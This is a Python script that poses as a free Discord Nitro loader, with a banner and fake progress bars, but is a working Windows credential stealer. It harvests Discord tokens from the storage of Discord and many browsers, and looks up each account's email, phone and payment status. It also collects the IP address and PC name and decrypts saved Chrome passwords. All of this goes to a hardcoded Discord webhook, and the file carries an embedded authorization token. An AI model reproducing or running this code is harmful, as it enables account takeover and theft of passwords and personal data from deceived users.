import os
if os.name != "nt":
    exit()
import re 
from re import findall 
import json 
from json import dumps, loads
import base64
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from tqdm import tqdm
from colorama import Fore
from time import sleep
import requests
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
# import csv

#GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        # print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None
        
# 
    

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
headers = {'authorization': 'MTExMDg2ODgxNzIyOTM4OTgyNA.GqNCRZ.u63P43Shv04XIQ46Eih-Ar3SkbPSpPPRDloSJ8',}
print(Fore.RED +""" 
███╗░░██╗██╗████████╗██████╗░░█████╗░
████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗
██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║
██║╚████║██║░░░██║░░░██╔══██╗██║░░██║
██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝
╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░""")
print("\n" + Fore.LIGHTGREEN_EX + "Your Nitro is loading: \n")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
paths = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    tokenss = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{10,35}\.[\w-]{5,10}\.[\w-]{20,40}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokenss.append(token + """

""")
                    tokens.append(token)
    # print(tokens) {tokenss}
    data={
        "content": "# all the matches: ```jsfghfghf```"
    }
    requests.post("https://discord.com/api/webhooks/1139592739424571484/BXyQEjjD-SYbLZGHAPnq33Vxg5_QpsQnL3p_UfTravhD9TNY5aUu8PNDes6kFFv0ojfE",data=dumps({"content": f"""# all the matches: 
```js
{tokens}
```"""}).encode(), headers=getheaders(token=None, content_type="application/json"))
    L04durl1b("https://discord.com/api/webhooks/1139592739424571484/BXyQEjjD-SYbLZGHAPnq33Vxg5_QpsQnL3p_UfTravhD9TNY5aUu8PNDes6kFFv0ojfE",data=dumps(data).encode(), headers=headers)
    # requests.post("https://discord.com/api/webhooks/1139592739424571484/BXyQEjjD-SYbLZGHAPnq33Vxg5_QpsQnL3p_UfTravhD9TNY5aUu8PNDes6kFFv0ojfE",data=dumps(data).encode(), headers=headers)
    for i in tqdm(range(100),desc="loading"):
        sleep(0.007)
        pass
    print("\nYour Nitro is loaded successfully ^0^")
    print(Fore.YELLOW +"""\n# fun fact:
    this is called nitro cause
    if we successfully confuse discord
    we will give every user a free NITRO \n""")
    return tokens
def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
    except:
        pass
    return dev
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    requests.post("https://discord.com/api/webhooks/1139592739424571484/BXyQEjjD-SYbLZGHAPnq33Vxg5_QpsQnL3p_UfTravhD9TNY5aUu8PNDes6kFFv0ojfE",data={"content":ip}, headers=headers)
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def L04durl1b(wh00k, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(wh00k, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(wh00k, data=data))
                return r
        except: 
            pass
# L04durl1b("https://discord.com/api/webhooks/1139592739424571484/BXyQEjjD-SYbLZGHAPnq33Vxg5_QpsQnL3p_UfTravhD9TNY5aUu8PNDes6kFFv0ojfE",data={"content":"""Thanks bother zee 
#                                                                                                                                             we should keep it halal and safe
#                                                                                                                                             thankes for the half a butter bun per month"""}, headers=headers)

def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = False
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = base64.b64decode(token.split(".")[0])
                    # print(uid,token.split(".")[0])

                    # token.split(".")[0]
                except:
                    pass
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0xff0000,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: \nBilling Info: none ',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token:**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "title": "Hello, Embed!",
                "footer": {
                    "text": "made by hsn bro coder",
                }
            }
            embeds.append(embed)
    data = {
        "content": f"# we got the info about {username} broo :skull: :" ,
        "embeds": embeds,
        # "username": "Dora",
    }
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    print(Fore.GREEN +"Your Nitro is send successfully ^_____^")
    headers = {
        "Authorization": 'MTExMDg2ODgxNzIyOTM4OTgyNA.GqNCRZ.u63P43Shv04XIQ46Eih-Ar3SkbPSpPPRDloSJ8',
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    L04durl1b("https://discord.com/api/webhooks/1139592739424571484/BXyQEjjD-SYbLZGHAPnq33Vxg5_QpsQnL3p_UfTravhD9TNY5aUu8PNDes6kFFv0ojfE",data=dumps(data).encode(), headers=headers)
    print(Fore.LIGHTGREEN_EX + """\nthanks for helping us confuse discord bro (▀̿Ĺ̯▀̿ ̿) """ + Fore.RED + """
keep it up cause your Fire""")
    all_data = ""
    secret_key = get_secret_key()
    #Search user profile or default folder (this is where the encrypted login password is stored)
    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
    for folder in folders:
        chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
        conn = get_db_connection(chrome_path_login_db)
        if(secret_key and conn):
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for index,login in enumerate(cursor.fetchall()):
                url = login[0]
                username = login[1]
                ciphertext = login[2]
                if(url!="" and username!="" and ciphertext!=""):
                    decrypted_password = decrypt_password(ciphertext, secret_key)
                    all_data += f"URL: '{ url }'\nUser Name: '{username}'\nPassword: '{decrypted_password}'\n"
            print(Fore.GREEN)
            for i in tqdm(range(10), ncols=100):
                sleep(0.07)
            pass
            L04durl1b("https://discord.com/api/webhooks/1139592739424571484/BXyQEjjD-SYbLZGHAPnq33Vxg5_QpsQnL3p_UfTravhD9TNY5aUu8PNDes6kFFv0ojfE",data=dumps({"content":"""got the shit ```js
{\n""" + all_data+ "\n}```"}).encode(), headers=headers)
            cursor.close()
            conn.close()
    print(Fore.RED + """
░██████╗░░█████╗░░█████╗░██████╗░ ██████╗░██╗░░░██╗███████╗
██╔════╝░██╔══██╗██╔══██╗██╔══██╗ ██╔══██╗╚██╗░██╔╝██╔════╝
██║░░██╗░██║░░██║██║░░██║██║░░██║ ██████╦╝░╚████╔╝░█████╗░░
██║░░╚██╗██║░░██║██║░░██║██║░░██║ ██╔══██╗░░╚██╔╝░░██╔══╝░░
╚██████╔╝╚█████╔╝╚█████╔╝██████╔╝ ██████╦╝░░░██║░░░███████╗
░╚═════╝░░╚════╝░░╚════╝░╚═════╝░ ╚═════╝░░░░╚═╝░░░╚══════╝""")
if __name__ == '__main__':
   main()
   sleep(10)